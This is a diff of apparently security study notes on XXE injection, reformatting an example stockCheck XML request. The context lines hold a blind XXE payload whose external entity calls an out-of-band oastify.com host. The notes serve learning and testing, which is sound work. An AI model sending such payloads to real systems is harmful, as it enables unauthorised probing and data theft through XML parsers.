@@ -12,10 +12,18 @@ Keep in mind that XML is just a data transfer format. Make sure you also test an
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://zhkjg0n2ikpienyuf43fiyvuelkc82wr.oastify.com"> ]>  >> For Blind xxe attack.
 &xxe;
 ```
-Example:
+####Example:
 Before Injection:
 ```xml
-<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>
+            1
+        </productId>
+        <storeId>
+            1
+        </storeId>
+    </stockCheck>
 ```
 After Injection:
 ```xml
